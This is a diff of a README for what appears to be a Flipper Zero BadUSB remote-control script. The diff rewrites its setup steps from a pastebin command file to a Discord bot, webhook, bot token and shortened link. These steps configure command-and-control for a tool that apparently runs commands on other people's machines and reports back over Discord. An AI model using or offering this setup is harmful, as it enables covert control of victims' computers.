@@ -14,10 +14,13 @@ Every 10 seconds it will check a file for a change in the file contents and inte
 *Using github to host your command file will take up to 5 minutes to run each module command - Use pastebin (account needed) OR your own server to host the txt file for instant response* 
 
 **SETUP**
-1. Goto https://pastebin.com and make an account..
-2. Create an empty paste/file and copy the RAW url.
-3. Change YOUR_FILE_URL to the RAW url  eg. https://pastebin.com/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
-4. Change YOUR_WEBHOOK_URL to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+1. make a discord bot at https://discord.com/developers/applications/
+2. add the bot to your discord server
+3. create a webhook in the desired channel on your server. ( channel-settings/integrations )
+4. FLIPPER ONLY - goto https://t.ly and make a short link for the webhook. (run prompt only allows 256 characters!)
+5. Change WEBHOOK_URL below to your short webhook URL eg. https://t.ly/byuf4e
+6. Change BOT_TOKEN below with your bot token
+7. Change CHANNEL_ID below to the channel id of your webhook.
 
 **USAGE**
 1. Setup the script
